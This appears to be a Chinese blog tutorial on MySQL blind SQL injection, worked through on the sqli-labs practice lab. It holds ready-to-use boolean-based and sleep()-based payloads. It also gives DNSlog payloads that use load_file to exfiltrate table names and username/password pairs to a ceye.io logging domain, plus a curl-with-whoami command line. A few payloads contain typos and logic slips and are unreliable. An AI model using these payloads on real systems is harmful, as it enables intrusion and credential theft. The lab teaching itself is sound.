@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="alternate" href="/atom.xml" title="C0cho's blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="本文主要总结Mysql下盲注技术布尔盲注代码存在SQL注入漏洞，但页面不会回显数据，也不会回显错误信息，只返回”Right”与”Wrong”，这里可以构造语句，来判断数据库语句的正确性，通过页面的“真”和“假”来识别我们的判断是否正确，“真”和“假”可以从返回页面，数据包长度，返回码等信息判断判断语句">
+<meta name="keywords" content="mysql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql注入之盲注">
+<meta property="og:url" content="https://choge.top/2020/01/17/Mysql注入之盲注/index.html">
+<meta property="og:site_name" content="C0cho&#39;s blog">
+<meta property="og:description" content="本文主要总结Mysql下盲注技术布尔盲注代码存在SQL注入漏洞，但页面不会回显数据，也不会回显错误信息，只返回”Right”与”Wrong”，这里可以构造语句，来判断数据库语句的正确性，通过页面的“真”和“假”来识别我们的判断是否正确，“真”和“假”可以从返回页面，数据包长度，返回码等信息判断判断语句">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-1.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-2.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-4.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-5.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-6.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-7.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-8.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-9.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-10.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-11.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-13.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-12.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-14.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-15.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-16.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-17.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-18.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-19.png">
+<meta property="og:image" content="https://choge.top/Users/c0cho/hexo/source/_posts/Mysql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/mysql-20.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-21.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-22.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-23.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-24.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-25.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-26.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-28.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-27.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-29.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-30.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-31.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-32.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-33.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-34.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-35.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-36.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-37.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-38.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-39.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-40.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-41.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-42.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-43.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-44.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-45.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-46.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-48.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-49.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-50.png">
+<meta property="og:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-51.png">
+<meta property="og:updated_time" content="2020-03-11T09:27:53.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mysql注入之盲注">
+<meta name="twitter:description" content="本文主要总结Mysql下盲注技术布尔盲注代码存在SQL注入漏洞，但页面不会回显数据，也不会回显错误信息，只返回”Right”与”Wrong”，这里可以构造语句，来判断数据库语句的正确性，通过页面的“真”和“假”来识别我们的判断是否正确，“真”和“假”可以从返回页面，数据包长度，返回码等信息判断判断语句">
+<meta name="twitter:image" content="https://choge.top/2020/01/17/Mysql注入之盲注/mysql-1.png">
+  <link rel="canonical" href="https://choge.top/2020/01/17/Mysql注入之盲注/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Mysql注入之盲注 | C0cho's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0cho's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">less is more</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">44</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://choge.top/2020/01/17/Mysql注入之盲注/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0cho">
+      <meta itemprop="description" content="记录生活的点点滴滴">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0cho's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            Mysql注入之盲注
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-01-17 13:58:37" itemprop="dateCreated datePublished" datetime="2020-01-17T13:58:37+08:00">2020-01-17</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-11 17:27:53" itemprop="dateModified" datetime="2020-03-11T17:27:53+08:00">2020-03-11</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Sql-injection/" itemprop="url" rel="index">
+                    <span itemprop="name">Sql injection</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>5.4k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>5 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文主要总结Mysql下盲注技术</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>代码存在SQL注入漏洞，但页面不会回显数据，也不会回显错误信息，只返回”Right”与”Wrong”，这里可以构造语句，来判断数据库语句的正确性，通过页面的“真”和“假”来识别我们的判断是否正确，“真”和“假”可以从返回页面，数据包长度，返回码等信息判断</p><h3 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h3><a id="more"></a>
+
+<table>
+<thead>
+<tr>
+<th align="center">方法</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">left()函数</td>
+<td align="center">left(database(),1)&gt;’s’                                                                                                      database()显示数据库名称，left(a,b)从左侧截取a的前b位</td>
+</tr>
+<tr>
+<td align="center">regexp</td>
+<td align="center">select user() regex ‘^r’                                                                                                                正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式</td>
+</tr>
+<tr>
+<td align="center">like</td>
+<td align="center">select user() like ‘ro%’                                                                                                                与regexp相似，使用like进行匹配</td>
+</tr>
+<tr>
+<td align="center">substr()函数                       ascii()函数</td>
+<td align="center">ascii(substr((select database()),1,1))=98        substr(a,b,c)从b位置开始，截取字符串a的长度，ascii()将某个字符转换为ascii值</td>
+</tr>
+<tr>
+<td align="center">ord()函数             mid()函数</td>
+<td align="center">ord(mid((select user()),1,1))=114  mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii()，将字符转换为ascii值</td>
+</tr>
+</tbody></table>
+<h3 id="布尔盲注实战"><a href="#布尔盲注实战" class="headerlink" title="布尔盲注实战"></a>布尔盲注实战</h3><p>布尔盲注实战以sqli_labxx关为实验环境</p>
+<p>判断注入</p>
+<p><code>http://127.0.0.1/Less-8/?id=1&#39;</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-1.png" alt="mysql-1"></p>
+<p><code>http://127.0.0.1/Less-8/?id=1&#39;&#39;</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-2.png" alt="mysql-2"></p>
+<h4 id="使用left判断"><a href="#使用left判断" class="headerlink" title="使用left判断"></a>使用left判断</h4><p>判断当前数据库第一个字符</p>
+<p><code>http://127.0.0.1/Less-8/?id=1&#39; and left((select database()),1)=&#39;s&#39; --+</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-4.png" alt="mysql-4"></p>
+<p><code>http://127.0.0.1/Less-8/?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39; --+</code>判断第一张表的第一个字符</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-5.png" alt="mysql-5"></p>
+<p>抓包进入bp的intruder模块进行快速判断，设置如下</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-6.png" alt="mysql-6"></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-7.png" alt="mysql-7"></p>
+<p>快速跑出有效数据</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-8.png" alt="mysql-8"></p>
+<p>判断第一张表的第二个字符</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-9.png" alt="mysql-9"></p>
+<p>第二个字符为m，以此类推，跑出完整数据</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-10.png" alt="mysql-10"></p>
+<p>判断第二张表的第一个字符</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-11.png" alt="mysql-11"></p>
+<p>第二张表的第一个字符为r</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-13.png" alt="mysql-13"></p>
+<p>判断第二张表的第二个字符</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-12.png" alt="mysql-12"></p>
+<p>第二张表的第二个字符为e，以此类推，跑出所以数据</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-14.png" alt="mysql-14"></p>
+<p>判断user表的第一个字段的第一个字符</p>
+<p><code>http://127.0.0.1/Less-8/?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1)=&#39;e&#39; --+</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-15.png" alt="mysql-15"></p>
+<p>设置如下</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-16.png" alt="mysql-16"></p>
+<p>user表的第一个字段的第一个字符为i</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-17.png" alt="mysql-17"></p>
+<p>user表的第一个字段的第二个字符为d</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-18.png" alt="mysql-18"></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-19.png" alt="mysql-19"></p>
+<h4 id="使用regexp判断"><a href="#使用regexp判断" class="headerlink" title="使用regexp判断"></a>使用regexp判断</h4><p><img src="/Users/c0cho/hexo/source/_posts/Mysql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/mysql-20.png" alt="mysql-20"></p>
+<p>判断第一个表的第一个字符</p>
+<p><code>http://127.0.0.1/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#39;^s&#39; --+</code></p>
+<p>抓包使用bp设置如下</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-21.png" alt="mysql-21"></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-22.png" alt="mysql-22"></p>
+<p>第一张表的第一个字符为e</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-23.png" alt="mysql-23"></p>
+<p>判断第一张表的第二个字符为m</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-24.png" alt="mysql-24"></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-25.png" alt="mysql-25"></p>
+<h4 id="使用like判断"><a href="#使用like判断" class="headerlink" title="使用like判断"></a>使用like判断</h4><p><code>http://127.0.0.1/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like&#39;a%&#39; --+</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-26.png" alt="mysql-26"></p>
+<p>抓包和设置如下</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-28.png" alt="mysql-28"></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-27.png" alt="mysql-27"></p>
+<p>第一个表的第一个字符为e</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-29.png" alt="mysql-29"></p>
+<p>第一个表的第二个字符为m</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-30.png" alt="mysql-30"></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-31.png" alt="mysql-31"></p>
+<p>以此类推跑出完整数据</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>代码存在sql注入漏洞，但页面即不会回显数据，也不会回显错误信息，语句执行也不提示真假，不能通过页面的内容来进行判断，这里可通过构造语句，通过页面响应的时长，来判断信息，即时间盲注。</p>
+<h3 id="核心语法"><a href="#核心语法" class="headerlink" title="核心语法"></a>核心语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(left(user(),1)=&apos;a&apos;,0,sleep(3))    #(user(),1)=&apos;a&apos;处替换sql语句</span><br><span class="line">if(sascii(substr(database(),1,1))&gt;115,0,sleep(5))%23  #(database(),1,1)和115处为替换sql语句</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用sacii和substr判断"><a href="#使用sacii和substr判断" class="headerlink" title="使用sacii和substr判断"></a>使用sacii和substr判断</h4><p><code>http://127.0.0.1/Less-8/?id=1&#39; and ascii(substr((select database()),1,1))=115--+</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-32.png" alt="mysql-32"></p>
+<p>ascii可使用python语法直接查询</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-33.png" alt="mysql-33"></p>
+<p>也可以对照ascii查询</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-34.png" alt="mysql-34"></p>
+<p>判断第一张表的第一个字符</p>
+<p><code>http://127.0.0.1/Less-8/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115--+</code></p>
+<p>bp设置如下</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-35.png" alt="mysql-35"></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-36.png" alt="mysql-36"></p>
+<p>第一个字符ascii为101为e</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-37.png" alt="mysql-37"></p>
+<p>判断第一张表的第二个字符</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-38.png" alt="mysql-38"></p>
+<p>第二个字符为m</p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-39.png" alt="mysql-39"></p>
+<p>以此类推，跑出所以数据</p>
+<h4 id="使用sleep判断"><a href="#使用sleep判断" class="headerlink" title="使用sleep判断"></a>使用sleep判断</h4><p>判断user表的第一个字符是否为a，是则执行3秒<code>http://127.0.0.1/Less-10/?id=1&quot; and if(left(user(),1)=&#39;a&#39;,0,sleep(3))--+</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-40.png" alt="mysql-40"></p>
+<p>判断user表的第一个d字段第一位否为r，是则不执行3秒<code>http://127.0.0.1/Less-10/?id=1&quot; and if(left(user(),1)=&#39;r&#39;,0,sleep(3))--+</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-41.png" alt="mysql-41"></p>
+<p>判断user表的第一个字段前两位是否为ro，是则不执行3秒<code>http://127.0.0.1/Less-10/?id=1&quot; and if(left(user(),1)=&#39;ro&#39;,0,sleep(3))--+</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-42.png" alt="mysql-42"></p>
+<p>判断user表的第一个字段前四位是否为ro，是则不执行3秒<code>http://127.0.0.1/Less-10/?id=1&quot; and if(left(user(),1)=&#39;root&#39;,0,sleep(3))--+</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-43.png" alt="mysql-43"></p>
+<p>判断第一个表的第一个字符第一位是否为e，是则不执行3秒</p>
+<p><code>http://127.0.0.1/Less-10/?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;,0,sleep(3))--+</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-44.png" alt="mysql-44"></p>
+<p>判断第一个表的第一个字符第一位是否为em，是则不执行3秒</p>
+<p><code>http://127.0.0.1/Less-10/?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&#39;em&#39;,0,sleep(3))--+</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-45.png" alt="mysql-45"></p>
+<p>以此类推，跑出所有数据</p>
+<h2 id="DnsLog注入"><a href="#DnsLog注入" class="headerlink" title="DnsLog注入"></a>DnsLog注入</h2><p>代码存在SQL注入漏洞，但页面不会回显数据，也不会回显错误信息。此时可通过布尔或者时间盲注可以获取到内容，但整个过程效率低，需要发送多次请求进行判断，很可能会触发安全设备的防护。这时需要一种方式，减少请求。直接回显数据，这里可以使用DnsLog注入实现。</p>
+<p>Dnslog 目标服务器是windows系统</p>
+<h3 id="DnsLog注入平台"><a href="#DnsLog注入平台" class="headerlink" title="DnsLog注入平台"></a>DnsLog注入平台</h3><p><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a><br>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取信息请求信息。</p>
+<p>###构造语句</p>
+<p>Mysql可构造语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.mysql.6gdl2p.ceye.io\\abc&apos;))   #select database()处插入sql语句进行查询，mysql为自己个性化标识，进行分类判断</span><br></pre></td></tr></table></figure>
+
+<p>系统执行<code>curl</code>whoami<code>.xxxx.cyce.io</code></p>
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-46.png" alt="mysql-46"></p>
+<p>Dnslog平台返回结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.16.123/sqli-labs-master/Less-9/?id=1&apos; and load_file(concat(&apos;\\\\&apos;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&apos;.mysql.6gdl2p.ceye.io\\abc&apos;))--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-48.png" alt="mysql-48"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.16.123/sqli-labs-master/Less-9/?id=1' and load_file(concat('\\\\',(<span class="keyword">select</span> <span class="keyword">concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.mysql.6gdl2p.ceye.io\\abc'</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-49.png" alt="mysql-49"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.16.123/sqli-labs-master/Less-9/?id=1&apos; and load_file(concat(&apos;\\\\&apos;,(select concat_ws(&apos;A&apos;,username,password) from security.users limit 0,1),&apos;.mysql.6gdl2p.ceye.io\\abc&apos;))--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-50.png" alt="mysql-50"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.16.123/sqli-labs-master/Less-9/?id=1&apos; and load_file(concat(&apos;\\\\&apos;,(select concat_ws(&apos;～&apos;,username,password) from security.users limit 0,1),&apos;.mysql.6gdl2p.ceye.io\\abc&apos;))--+</span><br></pre></td></tr></table></figure>
+
+<p>无返回，因为dnslog不能使用特殊字符，如要使用特殊字符分隔可以使用hex</p>
